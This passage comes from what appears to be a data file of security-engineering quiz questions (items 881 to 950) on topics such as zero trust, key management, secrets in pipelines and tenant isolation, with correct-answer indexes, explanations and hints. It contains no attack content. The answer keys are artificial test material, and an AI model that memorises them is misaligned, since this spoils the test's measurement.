    options: ["Allow all programs that run from the user's profile folder to start without checks, in the first instance","Allow approved publishers and paths, with a managed exception process, in most cases","Block only the names of known malware and allow every other program to start","Disable updates, and the allowed list does not have to change for a year"],
    correct: 1, why: "Blocklisting is the runner-up since it is easy to start, but it misses new threats; allowlisting reduces unknown execution.",
    hint: "Allow approved only."
  },
  {
    id: 882, rank: 2, role: "security-engineering", topic: "SSH Certificate Authentication", difficulty: "ADVANCED",
    q: "What is the benefit of SSH certificates over distributed static keys?",
    options: ["Faster login","No logging","Short-lived, centrally issued access that is easy to revoke and audit","Longer keys"],
    correct: 2, why: "Central issuance with expiry avoids orphaned keys.",
    hint: "Short-lived access."
  },
  {
    id: 883, rank: 2, role: "security-engineering", topic: "Database Least Privilege", difficulty: "ADVANCED",
    q: "Which database setup best limits damage from SQL injection in an application?",
    options: ["Anonymous access","One shared root account","An account with DBA rights","An application account with only the permissions it needs on specific tables"],
    correct: 3, why: "Least privilege limits what injected statements can do.",
    hint: "Limit the account."
  },
  {
    id: 884, rank: 2, role: "security-engineering", topic: "Dependency Pinning", difficulty: "ADVANCED",
    q: "Why pin dependencies by hash or exact version in builds?",
    options: ["To avoid unexpected or malicious changes being pulled automatically","To make builds slower","To hide the source","To remove testing"],
    correct: 0, why: "Reproducible builds reduce supply chain risk.",
    hint: "Pin it."
  },
  {
    id: 885, rank: 2, role: "security-engineering", topic: "Webhook Verification", difficulty: "ADVANCED",
    exhibit: "X-Signature: sha256=3f9b1c...\nX-Timestamp: 1709366400\nBody: {\"event\":\"payment.completed\",\"amount\":120}",
    q: "How should a service verify that a webhook really came from a trusted provider?",
    options: ["Trust the payload as only the provider knows the address of the endpoint","Check that the content length matches the size announced in the request header","Check an HMAC signature, and reject old timestamps, as soon as practical","Check the IP address of the sender only and accept any request from that range"],
    correct: 2, why: "Signed requests with replay protection prove authenticity and freshness.",
    hint: "Verify the signature."
  },
  {
    id: 886, rank: 2, role: "security-engineering", topic: "Secure Random Numbers", difficulty: "ADVANCED",
    q: "Which function should generate password reset tokens?",
    options: ["The username","A cryptographically secure random generator","The system clock","A counter"],
    correct: 1, why: "Predictable tokens can be guessed by attackers.",
    hint: "Use CSPRNG."
  },
  {
    id: 887, rank: 2, role: "security-engineering", topic: "Clipboard and Mobile Storage", difficulty: "ADVANCED",
    q: "Where should a mobile app store an authentication token?",
    options: ["In the app's public folder","In a log file","In plain text preferences","In the platform's secure storage such as the keychain or keystore"],
    correct: 3, why: "Secure storage protects tokens from other apps and backups.",
    hint: "Keychain."
  },
  {
    id: 888, rank: 2, role: "security-engineering", topic: "Security Unit Tests", difficulty: "ADVANCED",
    q: "Which test best proves an authorisation fix works?",
    options: ["A test that the page loads quickly","A test that a user cannot read another user's record and gets denied","A test of the footer","A test of the colour"],
    correct: 1, why: "Negative tests prove access is denied.",
    hint: "Test denial."
  },
  {
    id: 889, rank: 2, role: "security-engineering", topic: "IAM Policy Wildcard", difficulty: "ADVANCED",
    exhibit: "{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}",
    q: "What is the main problem with this policy statement?",
    options: ["It allows every action on every resource","It denies all actions","It enables logging","It names a user"],
    correct: 0, why: "Wildcards for action and resource grant far more access than any workload needs.",
    hint: "Wildcards."
  },
  {
    id: 890, rank: 2, role: "security-engineering", topic: "Subresource Integrity", difficulty: "ADVANCED",
    exhibit: "<script src=\"https://cdn.example/lib.js\" integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6...\" crossorigin=\"anonymous\"></script>",
    q: "How does subresource integrity protect a page that loads a script from a CDN?",
    options: ["It hides the script URL","It encrypts the script","It speeds up loading","The browser checks the file's hash and refuses a changed script"],
    correct: 3, why: "A hash in the tag detects tampering with third-party content.",
    hint: "Hash in the tag."
  },
  {
    id: 891, rank: 2, role: "security-engineering", topic: "Secrets in Pipelines Exhibit", difficulty: "ADVANCED",
    exhibit: "pipeline: build-and-deploy\nenv:\n  DB_HOST: db.prod.internal\n  DB_PASSWORD: 'Sup3rS3cret!'\nsteps:\n  - run: ./deploy.sh",
    q: "What is the main issue in this pipeline configuration?",
    options: ["Dependencies are pinned to verified versions","The build runs inside an isolated worker","The deployment needs a manual approval","A database password is stored in plain text in the repository"],
    correct: 3, why: "Credentials in code are visible to anyone with repository access.",
    hint: "Look at the variables."
  },
  {
    id: 892, rank: 2, role: "security-engineering", topic: "Container Image Hygiene", difficulty: "ADVANCED",
    q: "Which practice best reduces risk in container images?",
    options: ["Use the largest image available with every tool included","Keep images unchanged for years to avoid risk","Use minimal trusted base images and scan them regularly","Pull any image from the internet without checking"],
    correct: 2, why: "Smaller scanned images contain fewer vulnerabilities.",
    hint: "Minimal and scanned."
  },
  {
    id: 893, rank: 2, role: "security-engineering", topic: "Network Policy Choice", difficulty: "ADVANCED",
    q: "What is the BEST way to control network access between microservices?",
    options: ["Rely on the obscurity of internal service names, as soon as practical","Allow all traffic inside the cluster for simplicity","Define explicit policies allowing only required service connections","Open all ports, and monitor later"],
    correct: 2, why: "Allowing everything is the runner-up as it is simple, but a compromised service could reach all others.",
    hint: "Explicit allow."
  },
  {
    id: 894, rank: 2, role: "security-engineering", topic: "Identity Federation Choice", difficulty: "ADVANCED",
    q: "What is the main benefit of single sign-on with a central identity provider?",
    options: ["Users never need to authenticate, as a general rule","Centralised access control and consistent MFA","Administrators can no longer revoke access","Each application keeps its own password list"],
    correct: 1, why: "Central control improves lifecycle and policy enforcement.",
    hint: "One place."
  },
  {
    id: 895, rank: 2, role: "security-engineering", topic: "Logging Detection Link", difficulty: "ADVANCED",
    q: "How can engineering teams make logs more useful to detection?",
    options: ["Include user host and action fields in a consistent format","Write long free-text messages that are hard to parse","Turn off logging in production for speed, as a general rule","Log only successful actions"],
    correct: 0, why: "Structured logs support reliable detections.",
    hint: "Structure."
  },
  {
    id: 896, rank: 2, role: "security-engineering", topic: "WAF Tuning Exhibit", difficulty: "ADVANCED",
    exhibit: "Rule 942100 (SQL injection) blocks: 1,820 in 24h\n  URI /checkout/apply-coupon: 1,790 (98%)\n  Source IPs: 1,602 distinct, normal user agents\n  Sample parameter: code=SAVE-10%25\nOther rules: normal volumes",
    q: "What does this WAF report suggest the team should do?",
    options: ["Tune the rule that blocks legitimate checkout requests","Disable the WAF for the whole site, where that is practical","Ignore the blocks as they look random","Block the checkout page for all users, as a general rule"],
    correct: 0, why: "A rule causing many blocks on valid transactions needs tuning not removal.",
    hint: "Which rule?"
  },
  {
    id: 897, rank: 2, role: "security-engineering", topic: "Dependency Update Policy", difficulty: "ADVANCED",
    q: "What is the best policy for third-party library updates?",
    options: ["Rely on developers to remember which libraries are used","Never update to avoid breaking the build","Track vulnerabilities and update through a tested process","Update to any new version the day it is published"],
    correct: 2, why: "Managed updates reduce exposure and breakage.",
    hint: "Track and test."
  },
  {
    id: 898, rank: 2, role: "security-engineering", topic: "Hardware Security Module Use", difficulty: "ADVANCED",
    q: "What is an HSM typically used for?",
    options: ["Storing large video files, and revisit the decision after the next release","Increasing network bandwidth","Printing certificates, and revisit the decision after the next release","Protecting cryptographic keys, and performing operations securely"],
    correct: 3, why: "HSMs keep keys within tamper-resistant hardware.",
    hint: "Key protection."
  },
  {
    id: 899, rank: 2, role: "security-engineering", topic: "Zero Downtime Patching", difficulty: "ADVANCED",
    q: "How can teams patch a critical service without downtime?",
    options: ["Disable the service while patching in business hours","Delay patching until the service is retired","Patch every instance at the same moment","Use rolling updates across redundant instances"],
    correct: 3, why: "Redundancy allows staged updates.",
    hint: "Rolling."
  },
  {
    id: 900, rank: 2, role: "security-engineering", topic: "Threat Model Output", difficulty: "ADVANCED",
    q: "What is a useful output of a threat modelling session?",
    options: ["A list of the people who attended","A list of threats with mitigations and owners","A detailed list of the colours used in the interface","A single sentence saying the system is secure"],
    correct: 1, why: "Threat modelling should lead to actions.",
    hint: "Mitigations and owners."
  },
  {
    id: 901, rank: 3, role: "security-engineering", topic: "Zero Trust Migration", difficulty: "EXPERT",
    exhibit: "Flow inventory (30 days)\nWorkstations -> File servers : 41% of flows, SMB\nWorkstations -> Workstations : 12% of flows, SMB/RDP (unexpected)\nServers -> Internet : 9%, mixed\nUnknown dependencies: 18 legacy hosts",
    q: "A flat corporate network is moving towards zero trust. What is the BEST first phase?",
    options: ["Replace the whole network with a new product in a single weekend, and revisit the decision after the next release","Map flows and identities, then protect the most critical assets first, where that is practical","Block all internal traffic, and wait for users to report what broke","Buy a zero trust platform, and declare the programme finished"],
    correct: 1, why: "A big-bang replacement is the runner-up since it is decisive, but it breaks the business; understanding flows lets you segment safely.",
    hint: "Flows first."
  },
  {
    id: 902, rank: 3, role: "security-engineering", topic: "Service Mesh Identity", difficulty: "EXPERT",
    q: "Several hundred microservices need authenticated and encrypted calls. Which design fits best?",
    options: ["A shared password stored in each service configuration file","IP allowlists maintained by hand in each firewall rule set, as a general rule","Workload identity with automatic mTLS certificates issued by a platform CA","A single long-lived API key shared by every team"],
    correct: 2, why: "Short-lived workload certificates give strong identity without manual secret handling.",
    hint: "Workload identity."
  },
  {
    id: 903, rank: 3, role: "security-engineering", topic: "Key Hierarchy Design", difficulty: "EXPERT",
    exhibit: "Current state\nKEK: none\nData key: one AES-256 key in app config, used for all 240 databases\nRotation: never\nBackups: encrypted with the same key",
    q: "Which key management architecture best limits the impact of a compromised data key?",
    options: ["Data keys stored beside the data they protect on the same disk, in most cases","One master key used directly to encrypt every file in the company","A hierarchy where master keys in an HSM wrap per-dataset data keys","Keys printed, and kept in a drawer by the application owner"],
    correct: 2, why: "Envelope encryption confines exposure to one data key and keeps the master key protected.",
    hint: "Envelope encryption."
  },
  {
    id: 904, rank: 3, role: "security-engineering", topic: "Pipeline Secrets", difficulty: "EXPERT",
    q: "A company wants to remove database passwords from its build pipelines. What design is best?",
    options: ["Email the passwords to the build team each month for convenience","Pipelines fetch short-lived credentials from a secrets service","Hardcode the passwords in the pipeline file, and lock the repository","Share one password file between all of the build jobs"],
    correct: 1, why: "Credentials issued at run time leave no standing secret in the pipeline.",
    hint: "Issue at run time."
  },
  {
    id: 905, rank: 3, role: "security-engineering", topic: "Authorisation Architecture", difficulty: "EXPERT",
    q: "Many services implement their own access rules inconsistently. What is the BEST architectural direction?",
    options: ["A central policy engine with policy as code and decision logs","A single hard-coded admin role in the shared library, as a general rule","A paper standard that describes how to write access checks, as a general rule","Each team writes its own rules in its own service as before, in most cases"],
    correct: 0, why: "A paper standard is the runner-up since it is cheap, but it cannot ensure consistent enforcement; policy as code can be tested and audited.",
    hint: "Central policy."
  },
  {
    id: 906, rank: 3, role: "security-engineering", topic: "Software Supply Chain Assurance", difficulty: "EXPERT",
    q: "Which architecture best gives confidence that a production artefact came from the intended source?",
    options: ["A shared build account with access to all repositories, as a general rule","A build performed on a developer laptop and emailed to operations, as a general rule","A manual copy of binaries to the server with a checksum in chat","Hermetic builds that sign provenance and a deploy gate that verifies it"],
    correct: 3, why: "Signed provenance verified at deploy time links the artefact to its source and builder.",
    hint: "Verify provenance."
  },
  {
    id: 907, rank: 3, role: "security-engineering", topic: "Multi-Tenant Isolation", difficulty: "EXPERT",
    q: "A SaaS product hosts many customers in one application. Which control gives the strongest tenant isolation?",
    options: ["A naming convention for customer tables in the shared database schema","A warning in the contract that customers must not look at each other's data","Tenant-scoped identity and data access enforced in the data layer","Tenant IDs checked only in the user interface by the front end code of the application"],
    correct: 2, why: "Enforcement in the data layer prevents a single application bug from crossing tenants.",
    hint: "Enforce below the app."
  },
  {
    id: 908, rank: 3, role: "security-engineering", topic: "Tokenisation Design", difficulty: "EXPERT",
    q: "Card numbers must be used in several systems that do not need the real value. What is the best design?",
    options: ["Encrypt the numbers with the same key in all of the systems","Replace card numbers with tokens held in a vault and restrict detokenisation","Copy the numbers into each system with access for all staff, where that is practical","Mask all but four digits, and store the rest in a spreadsheet"],
    correct: 1, why: "Tokens shrink the number of systems that handle the real data.",
    hint: "Reduce data scope."
  },
  {
    id: 909, rank: 3, role: "security-engineering", topic: "Privileged Access Architecture", difficulty: "EXPERT",
    q: "Which architecture best reduces standing administrator rights across cloud and servers?",
    options: ["Permanent admin rights for every engineer who requests them, in most cases","A shared admin password stored in the team wiki","An annual review of the admin group by the line manager, in most cases","A broker issuing time-limited elevated access with recorded sessions"],
    correct: 3, why: "Just-in-time access with recording limits exposure and creates accountability.",
    hint: "Time-limited and recorded."
  },
  {
    id: 910, rank: 3, role: "security-engineering", topic: "Algorithm Replacement Plan", difficulty: "EXPERT",
    q: "A product signs data using a hash function that is now considered weak. What is the BEST long-term approach?",
    options: ["Increase the length of the signing key and leave the hash as it is","Replace the algorithm in each place when a problem is reported","Make algorithms configurable so that they can be swapped centrally","Keep the hash as it is and rely on the network firewall to protect it"],
    correct: 2, why: "Replacing in each place is the runner-up as it works eventually, but scattered usage makes migrations slow and error-prone.",
    hint: "Configure centrally."
  },
  {
    id: 911, rank: 3, role: "security-engineering", topic: "Network Zoning Strategy", difficulty: "EXPERT",
    q: "A company wants to contain ransomware spread in its data centre. Which design is the most effective?",
    options: ["Micro-segmentation with default-deny between workloads","Separate networks for each building with open links between all of them","VLANs by department with all inter-VLAN traffic allowed between the departments","One large flat network with a very strong perimeter firewall at the edge"],
    correct: 0, why: "East-west control limits lateral movement after an initial compromise.",
    hint: "Control east-west."
  },
  {
    id: 912, rank: 3, role: "security-engineering", topic: "Logging Architecture", difficulty: "EXPERT",
    exhibit: "Source        Time   Format      Retention  Immutable\nFirewall      UTC    CEF         30d        no\nIdP           local  JSON        400d       no\nEDR           UTC    JSON        90d        no\nApp servers   mixed  free text   7d         no",
    q: "What should the central logging architecture guarantee for security use?",
    options: ["Short retention periods to save money on storage for the logging platform","Maximum volume with no filtering at all, and every possible event is kept","Local storage on each server with manual collection by the team when needed","Integrity, retention, access control and consistent time, in most cases"],
    correct: 3, why: "Logs must be trustworthy and usable to support detection and investigation.",
    hint: "Trustworthy logs."
  },
  {
    id: 913, rank: 3, role: "security-engineering", topic: "DDoS Resilience Design", difficulty: "EXPERT",
    q: "Which architecture best protects a critical public service from large volumetric attacks?",
    options: ["Anycast CDN and scrubbing in front with rate limits and origin hiding","A bigger server in the main data centre with more bandwidth, in most cases","Turning on logging, and watching for the attack","Blocking all traffic from other countries permanently"],
    correct: 0, why: "Absorbing traffic upstream protects capacity and keeps the origin reachable.",
    hint: "Absorb upstream."
  },
  {
    id: 914, rank: 3, role: "security-engineering", topic: "Confidential Computing", difficulty: "EXPERT",
    q: "When is confidential computing most useful?",
    options: ["When the network between the data centres is slow, and drops many packets","When data must stay protected from the host operator in use","When the disks on the servers are too small to hold the encrypted databases","When the logs from the application are missing for part of the previous week"],
    correct: 1, why: "Hardware-protected enclaves shield data in use from privileged host access.",
    hint: "Protect data in use."
  },
  {
    id: 915, rank: 3, role: "security-engineering", topic: "Platform Guardrails", difficulty: "EXPERT",
    q: "Hundreds of teams deploy to the cloud with inconsistent security settings. What is the BEST way to scale security?",
    options: ["Golden paths and preventive guardrails built into the platform","An approval board that meets weekly to review the changes proposed by teams","A policy document that all of the teams are asked to read once at joining","A manual security review of every deployment"],
    correct: 0, why: "Manual review is the runner-up since it catches issues, but it does not scale; paved paths make the secure way the easy way.",
    hint: "Secure by default."
  },
  {
    id: 916, rank: 3, role: "security-engineering", topic: "Identity Provider Resilience", difficulty: "EXPERT",
    q: "The single identity provider is a dependency for every application. Which design best protects availability?",
    options: ["Break-glass accounts outside the provider and tested failover","No fallback as the provider is highly available","Local passwords on every server for all users, as a general rule","A second provider managed by the same administrators, in most cases"],
    correct: 0, why: "Independent recovery paths protect operations without weakening day-to-day control.",
    hint: "Independent break-glass."
  },
  {
    id: 917, rank: 3, role: "security-engineering", topic: "Edge Architecture", difficulty: "EXPERT",
    q: "Which design best secures partner API access to internal systems?",
    options: ["Open endpoints protected by obscurity","An API gateway with mutual TLS, scoped tokens and rate limits","Direct database access for each partner","A VPN with a shared password for all partners, as a general rule"],
    correct: 1, why: "Gateways centralise authentication, authorisation and throttling.",
    hint: "Gateway with mTLS."
  },
  {
    id: 918, rank: 3, role: "security-engineering", topic: "Threat Modelling at Scale", difficulty: "EXPERT",
    q: "How can a large engineering organisation make threat modelling scale?",
    options: ["One central team that models every single change made by every product team","Skip threat modelling entirely and rely on penetration testing before each release","Only model a system after an incident has shown that it has a real weakness","Templates, champions and triggers for high-risk changes, in most cases"],
    correct: 3, why: "Scaling needs distributed ownership with clear criteria.",
    hint: "Champions and triggers."
  },
  {
    id: 919, rank: 3, role: "security-engineering", topic: "Vulnerability Management Design", difficulty: "EXPERT",
    q: "Which architecture best ensures vulnerabilities are fixed and not just found?",
    options: ["A weekly spreadsheet emailed to everyone who might have any interest in the findings","A private list of findings kept by the security team without sharing it with owners","Asset-linked findings with owners, deadlines and tracking to closure","Scanner reports archived each month in a shared folder for later reference"],
    correct: 2, why: "Ownership and workflow drive remediation.",
    hint: "Owners and deadlines."
  },
  {
    id: 920, rank: 3, role: "security-engineering", topic: "Backup Architecture", difficulty: "EXPERT",
    q: "Which design best ensures backups survive an attacker with domain admin rights?",
    options: ["Immutable copies in a separate account with its own credentials","Backups written to the domain-joined file server that administrators can reach","A mapped network drive that is visible to every administrator in the domain","A copy stored on the same hypervisor that hosts the production virtual machines"],
    correct: 0, why: "Separation of credentials and immutability stop attackers destroying recovery data.",
    hint: "Immutable and separate."
  },
  {
    id: 921, rank: 3, role: "security-engineering", topic: "Container Platform Security", difficulty: "EXPERT",
    q: "Which control best limits blast radius if a container is compromised?",
    options: ["Sharing one namespace for all workloads","Non-root, read-only filesystems, network policies and tight runtime policy","Running all containers as root for convenience, until the next scheduled review takes place","Allowing every container to reach the cloud metadata service, until the next scheduled review takes place"],
    correct: 1, why: "Layered runtime controls contain the compromised workload.",
    hint: "Contain the workload."
  },
  {
    id: 922, rank: 3, role: "security-engineering", topic: "Data Lake Access Design", difficulty: "EXPERT",
    q: "Which design best protects sensitive columns in a shared analytics data lake?",
    options: ["Copying the data to personal workbooks, where that is practical","Removing the audit logs for speed","Giving all analysts the same role, until the next scheduled review takes place","Attribute-based access with column masking and audited queries"],
    correct: 3, why: "Fine-grained controls allow analytics without exposing sensitive values.",
    hint: "Fine-grained and audited."
  },
  {
    id: 923, rank: 3, role: "security-engineering", topic: "Secure Enclave Boundary", difficulty: "EXPERT",
    q: "What is the main limitation of relying only on a network perimeter for security?",
    options: ["Perimeters cannot block any traffic, and only record what they have seen","Perimeters are always too slow to handle the traffic of a modern company","Once inside, an attacker can often move freely","Perimeters do not support encryption of the data that crosses the boundary"],
    correct: 2, why: "Perimeter-only models lack internal controls.",
    hint: "Inside is trusted."
  },
  {
    id: 924, rank: 3, role: "security-engineering", topic: "API Security Architecture", difficulty: "EXPERT",
    q: "A company exposes hundreds of APIs from different teams. What is the BEST way to improve consistency of API security?",
    options: ["Central discovery, a gateway baseline and automated tests, in most cases","Annual penetration testing only, carried out by an outside firm on a sample","Letting each team pick its own approach to authentication and authorisation","A wiki page of recommendations"],
    correct: 0, why: "A wiki page is the runner-up since it is easy to publish, but it does not enforce anything; automation and a baseline do.",
    hint: "Baseline and tests."
  },
  {
    id: 925, rank: 3, role: "security-engineering", topic: "Legacy Containment", difficulty: "EXPERT",
    exhibit: "Segment OT-LEG\nHosts: 14 (Windows XP/7), no patches available\nCurrent rules: ANY -> OT-LEG allow; OT-LEG -> ANY allow\nRequired flows: HMI to PLC tcp/502, historian pull tcp/1433",
    q: "Plant controllers cannot be patched and must keep running. What compensating strategy is best?",
    options: ["Rely on staff to avoid risky websites","Disable logging to save resources","Install antivirus on each and leave them on the flat network, as a first step","Isolate them behind a firewall with allow-listed flows and monitoring"],
    correct: 3, why: "Compensating controls around the system reduce exposure when patching is impossible.",
    hint: "Isolate and monitor."
  },
  {
    id: 926, rank: 3, role: "security-engineering", topic: "Email Security Architecture", difficulty: "EXPERT",
    q: "Which design best reduces phishing and impersonation at the organisation level?",
    options: ["Blocking all external email, and no phishing message can reach any user","Sender authentication, gateway filtering, link protection and easy reporting","User awareness training carried out once a year, with no technical controls added","Allowing all attachments through the gateway, and relying on user judgement"],
    correct: 1, why: "Layered technical controls with user reporting reduce successful attacks.",
    hint: "Layers and reporting."
  },
  {
    id: 927, rank: 3, role: "security-engineering", topic: "Endpoint Architecture", difficulty: "EXPERT",
    q: "Which endpoint architecture best supports rapid containment?",
    options: ["Manual checking of each device by the users when they suspect a problem","Agent telemetry with remote isolation and central policy","Local antivirus only, updated by the users when they remember to run the update","Weekly full scans scheduled for Sunday night on each of the laptops"],
    correct: 1, why: "Central visibility and response speed up containment.",
    hint: "Isolate remotely."
  },
  {
    id: 928, rank: 3, role: "security-engineering", topic: "DNS Architecture", difficulty: "EXPERT",
    q: "How can DNS architecture support security?",
    options: ["Disabling the DNS logs to save storage, and reduce the cost of the platform","Using only IP addresses, and DNS is never needed by the applications","Protective resolvers, query logging and restricted external resolvers","Allowing any host to use any resolver"],
    correct: 2, why: "DNS is a control point for blocking and detecting malicious domains.",
    hint: "Control DNS."
  },
  {
    id: 929, rank: 3, role: "security-engineering", topic: "Release Gating", difficulty: "EXPERT",
    q: "Which release gate design best balances speed and assurance?",
    options: ["Manual review of every single change by the security team before release","No gates at all, and every change reaches production at maximum speed","A single gate immediately before production that all of the changes must pass","Risk-based gates with automation and manual review for high risk"],
    correct: 3, why: "Automated and risk-based gates keep pace with delivery.",
    hint: "Risk-based."
  },
  {
    id: 930, rank: 3, role: "security-engineering", topic: "Observability and Security", difficulty: "EXPERT",
    q: "Why should security share telemetry infrastructure with engineering observability?",
    options: ["It removes the need for detection","It makes logs shorter","Common pipelines reduce cost, and provide richer context for detection, in most cases","It avoids access control"],
    correct: 2, why: "Shared data improves visibility and efficiency when access is controlled.",
    hint: "Shared pipelines."
  },
  {
    id: 931, rank: 3, role: "security-engineering", topic: "Secure Defaults in Libraries", difficulty: "EXPERT",
    q: "How should an internal crypto library be designed?",
    options: ["With safe defaults and no unsafe options exposed to developers, as a general rule","With every option available","With deprecated algorithms enabled","With no documentation"],
    correct: 0, why: "Hard-to-misuse APIs reduce cryptographic errors.",
    hint: "Hard to misuse."
  },
  {
    id: 932, rank: 3, role: "security-engineering", topic: "Resilient Authentication", difficulty: "EXPERT",
    q: "Which design keeps authentication available during a cloud region failure?",
    options: ["Multi-region deployment with tested failover and independent dependencies","One region only","Disabling MFA","Manual recovery from a document"],
    correct: 0, why: "Resilience needs redundancy and tested recovery.",
    hint: "Multi-region."
  },
  {
    id: 933, rank: 3, role: "security-engineering", topic: "Trust Between Environments", difficulty: "EXPERT",
    q: "How should production and development environments be related?",
    options: ["Production access for all developers","One shared account for convenience","A shared admin role","Separate accounts and credentials with no trust from development to production, and review the outcome at the next monthly meeting"],
    correct: 3, why: "Separation limits blast radius of development compromise.",
    hint: "Separate."
  },
  {
    id: 934, rank: 3, role: "security-engineering", topic: "Evidence of Control Operation", difficulty: "EXPERT",
    q: "Which architecture best provides continuous evidence for auditors?",
    options: ["Automated control checks that record results in a tamper-evident store","Annual screenshots","A verbal briefing","Email statements from owners"],
    correct: 0, why: "Machine-generated evidence is reliable and repeatable.",
    hint: "Automated evidence."
  },
  {
    id: 935, rank: 3, role: "security-engineering", topic: "Dependency on Open Source", difficulty: "EXPERT",
    q: "How should a company manage risk from critical open-source libraries?",
    options: ["Block all open source","Rely on luck","Maintain an inventory, monitor advisories and plan upgrades or replacements with owners, in most cases","Ignore them as they are free"],
    correct: 2, why: "Visible ownership of dependencies enables timely action.",
    hint: "Inventory and owners."
  },
  {
    id: 936, rank: 3, role: "security-engineering", topic: "Mobile Device Architecture", difficulty: "EXPERT",
    q: "Which approach best protects company data on employee phones?",
    options: ["Allow any device with no checks","Ban all mobile access","Store data on the phone's open storage","Managed apps with containerisation, device compliance checks and remote wipe of company data, as a general rule"],
    correct: 3, why: "Controls should separate and protect company data on personal devices.",
    hint: "Separate and manage."
  },
  {
    id: 937, rank: 3, role: "security-engineering", topic: "Rate Limiting Architecture", difficulty: "EXPERT",
    q: "Where should coarse rate limiting for internet traffic normally be applied?",
    options: ["Only inside the database","Only on the developer laptop","Nowhere","At the edge, before traffic reaches the application, as a general rule"],
    correct: 3, why: "Early filtering protects downstream systems.",
    hint: "At the edge."
  },
  {
    id: 938, rank: 3, role: "security-engineering", topic: "Security Review Capacity", difficulty: "EXPERT",
    q: "The security team cannot review every project. What is the best approach?",
    options: ["Skip reviews","Review everything slowly","Review only after launch","Triage by risk with self-service checklists and full review for high-risk work"],
    correct: 3, why: "Risk-based triage focuses scarce expertise.",
    hint: "Triage by risk."
  },
  {
    id: 939, rank: 3, role: "security-engineering", topic: "Architecture Review Finding", difficulty: "EXPERT",
    exhibit: "Internet -> WAF -> Web tier (DMZ)\nWeb tier -> App tier (private)\nApp tier -> Orders DB (private)\nWeb tier -> Reporting DB (private, direct)\nAdmin -> Jump host -> App tier",
    q: "An architecture review of this design finds a high-risk weakness. Which is it?",
    options: ["Logs flow to a central collector","The API tier sits behind a gateway","The reporting database is reachable from the internet-facing tier","The admin network has its own jump host"],
    correct: 2, why: "Placing the database where public-facing components can reach it removes a layer of protection.",
    hint: "Check the arrows."
  },
  {
    id: 940, rank: 3, role: "security-engineering", topic: "Certificate Revocation Design", difficulty: "EXPERT",
    q: "Clients keep trusting a leaked certificate for days. Which improvement shortens that window?",
    options: ["Short-lived certificates with automated renewal and revocation checks","Make the certificate validity much longer","Remove revocation checks to speed up connections, and review the outcome at the next monthly meeting","Share the private key with the vendor for backup, as soon as practical"],
    correct: 0, why: "Short lifetimes and working revocation limit how long a stolen certificate is useful.",
    hint: "Shrink the window."
  },
  {
    id: 941, rank: 3, role: "security-engineering", topic: "Zero Trust Architecture", difficulty: "EXPERT",
    q: "Which design best reflects zero trust?",
    options: ["Trust everything inside the corporate network, and revisit the decision after the next release","Allow all VPN users access to all systems, as soon as practical","Verify identity device and context on every access request","Authenticate only once per month"],
    correct: 2, why: "Zero trust removes implicit trust based on location.",
    hint: "Verify each request."
  },
  {
    id: 942, rank: 3, role: "security-engineering", topic: "Multi-Region Key Management", difficulty: "EXPERT",
    q: "An architecture spans two regions. What is the BEST key management design?",
    options: ["Separate keys with no recovery procedure at all, until the next scheduled review takes place","One key copied into plain files in each region","A shared key written in the application documentation, as a general rule","Region-specific keys with controlled replication and tested recovery"],
    correct: 3, why: "One copied key is the runner-up as it is simple, but it spreads exposure and weakens control.",
    hint: "Control and recover."
  },
  {
    id: 943, rank: 3, role: "security-engineering", topic: "Service Mesh Policy Exhibit", difficulty: "EXPERT",
    exhibit: "kind: AuthorizationPolicy\nmetadata: name=payment-allow namespace=prod\nspec:\n  selector: app=payment\n  rules:\n  - from:\n    - source: principals: [\"cluster.local/ns/prod/sa/checkout\"]\n    to: [{operation: {methods: [\"POST\"], paths: [\"/charge\"]}}]",
    q: "What does this policy allow?",
    options: ["No service may call the payment service, and the payment path is switched off","The payment service may call any other service in the cluster with its own role","Any service in the cluster may call the payment service with no further checks","Only the checkout service may call the payment service"],
    correct: 3, why: "The principal is restricted to one calling identity.",
    hint: "Read the principal."
  },
  {
    id: 944, rank: 3, role: "security-engineering", topic: "Data Classification Architecture", difficulty: "EXPERT",
    q: "How should data classification drive architecture?",
    options: ["By ignoring classification for internal systems","By letting each developer decide","By selecting stronger controls for more sensitive data","By storing all data in the same way"],
    correct: 2, why: "Controls should be proportionate to sensitivity.",
    hint: "Match controls."
  },
  {
    id: 945, rank: 3, role: "security-engineering", topic: "Resilient Logging Design", difficulty: "EXPERT",
    q: "Which design best keeps security logging available during an incident?",
    options: ["Turning off logging when load is high","Redundant collectors with buffering and protected storage","One collector on a single virtual machine","Logging to each host's local disk only, as soon as practical"],
    correct: 1, why: "Buffering and redundancy prevent loss of evidence.",
    hint: "Redundant."
  },
  {
    id: 946, rank: 3, role: "security-engineering", topic: "Secure Multi-Tenancy", difficulty: "EXPERT",
    q: "What is the key requirement of a secure multi-tenant design?",
    options: ["Sharing one data store without access rules","Strong logical isolation between tenants","Using the same credentials for all tenants","Trusting tenants to separate their own data"],
    correct: 1, why: "Isolation prevents cross-tenant access.",
    hint: "Isolation."
  },
  {
    id: 947, rank: 3, role: "security-engineering", topic: "Resilient Identity Architecture", difficulty: "EXPERT",
    q: "Which design best limits the effect of an identity provider failure on critical operations?",
    options: ["Making all services depend on one live check for each request, wherever possible","Cached sessions for key services with tested emergency access","Removing authentication from internal tools, where that is practical","Relying on one administrator to fix outages"],
    correct: 1, why: "Planned fallbacks keep operations running safely.",
    hint: "Fallback."
  },
  {
    id: 948, rank: 3, role: "security-engineering", topic: "API Gateway Pattern", difficulty: "EXPERT",
    q: "What is the main benefit of an API gateway in front of backend services?",
    options: ["A replacement for authorisation inside services, as a general rule","A way to make every service public","A single place to enforce authentication limits and logging","A faster compiler for the services"],
    correct: 2, why: "A gateway centralises common controls.",
    hint: "Central enforcement."
  },
  {
    id: 949, rank: 3, role: "security-engineering", topic: "Review Priority Exhibit", difficulty: "EXPERT",
    exhibit: "Item                                         Rating\nInternet-facing service holds master key     Critical\nDashboard font inconsistent                  Cosmetic\nService name hard to pronounce               Cosmetic\nDiagram has no legend                        Low",
    q: "Which design risk in this review should be addressed first?",
    options: ["A diagram without a legend","An internet-facing service holding the master encryption key","A service name that is hard to pronounce","A dashboard with an inconsistent font"],
    correct: 1, why: "Exposed key material has the highest impact.",
    hint: "Key exposure."
  },
  {
    id: 950, rank: 3, role: "security-engineering", topic: "Rebuild Instead of Repair", difficulty: "EXPERT",
    q: "Why rebuild a suspected compromised server from a trusted image?",
    options: ["It removes unknown changes that cleaning might miss","It is always quicker than monitoring","It deletes the audit trail","It avoids the need for backups"],
    correct: 0, why: "A clean build restores a known good state.",
    hint: "Known good."
  },
  {
